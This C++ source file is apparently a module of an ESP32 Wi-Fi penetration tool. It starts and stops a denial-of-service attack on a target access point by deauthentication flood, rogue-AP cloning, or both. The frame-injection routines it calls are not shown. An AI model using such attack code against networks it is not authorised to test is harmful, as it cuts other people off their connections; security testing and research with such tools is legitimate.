/**
 * @file attack_dos.cpp
 * @brief DoS (deauth flood) attack — converted to C++
 * @author risinek (risinek@gmail.com) | C++ port: Teuku Maulana (TM26)
 */

#include "attack_dos.h"

#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"

#include "attack.h"
#include "attack_method.h"
#include "wifi_controller.h"

static const char *TAG = "attack_dos";

static attack_dos_methods_t s_method = static_cast<attack_dos_methods_t>(-1);

extern "C" void attack_dos_start(attack_config_t *cfg) {
    ESP_LOGI(TAG, "Starting DoS attack...");
    s_method = static_cast<attack_dos_methods_t>(cfg->method);

    switch (s_method) {
        case ATTACK_DOS_METHOD_BROADCAST:
            ESP_LOGD(TAG, "Method: BROADCAST");
            attack_method_broadcast(cfg->ap_record, 1);
            break;
        case ATTACK_DOS_METHOD_ROGUE_AP:
            ESP_LOGD(TAG, "Method: ROGUE_AP");
            attack_method_rogueap(cfg->ap_record);
            break;
        case ATTACK_DOS_METHOD_COMBINE_ALL:
            ESP_LOGD(TAG, "Method: COMBINE_ALL");
            attack_method_rogueap(cfg->ap_record);
            attack_method_broadcast(cfg->ap_record, 1);
            break;
        default:
            ESP_LOGE(TAG, "Unknown method — DoS not started");
    }
}

extern "C" void attack_dos_stop() {
    switch (s_method) {
        case ATTACK_DOS_METHOD_BROADCAST:
            attack_method_broadcast_stop();
            break;
        case ATTACK_DOS_METHOD_ROGUE_AP:
            wifictl_mgmt_ap_start();
            wifictl_restore_ap_mac();
            break;
        case ATTACK_DOS_METHOD_COMBINE_ALL:
            attack_method_broadcast_stop();
            wifictl_mgmt_ap_start();
            wifictl_restore_ap_mac();
            break;
        default:
            ESP_LOGE(TAG, "Unknown method — attack may not be fully stopped");
    }
    ESP_LOGI(TAG, "DoS attack stopped");
}
